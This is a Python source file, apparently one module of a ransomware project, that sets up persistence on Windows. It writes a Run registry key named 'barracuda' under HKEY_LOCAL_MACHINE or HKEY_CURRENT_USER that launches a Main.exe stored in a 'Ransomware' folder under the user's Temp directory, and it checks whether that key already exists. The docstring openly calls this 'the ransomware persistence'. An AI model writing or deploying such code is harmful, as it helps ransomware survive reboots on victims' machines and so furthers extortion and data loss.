# import Windows registry API
import winreg, os

def create_registry_key(name, value, path, is_admin):
    """
    Create a registry key
    :param name -- registry key name:
    :param value -- registry key value:
    :param path -- path to registry key:
    :param is_admin -- Check if the code is executed as an admin
    """
    try:
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER,
                               path)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
    except:
        print("Can't create the key : An error occurs")


def check_if_key_exists(is_admin):
    """
    Check if a registry key exists
    :return -- registryKeyExists : TRUE or FALSE:
    """
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER,
                             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",
                             0,
                             winreg.KEY_READ
                             )
        winreg.QueryValueEx(key, "barracuda")
    except WindowsError:
        return False

    return True


def create_persistence(is_admin):
    """
    Create the ransomware persistence
    :param is_admin -- Check if the code is executed as an admin:
    """
    path = "SOFTWARE" if is_admin else "Software"
    create_registry_key("barracuda",
                        os.path.expanduser("~") + "\\AppData\\Local\\Temp\\Ransomware\\Main.exe",
                        path + "\\Microsoft\\Windows\\CurrentVersion\\Run",
                        is_admin)

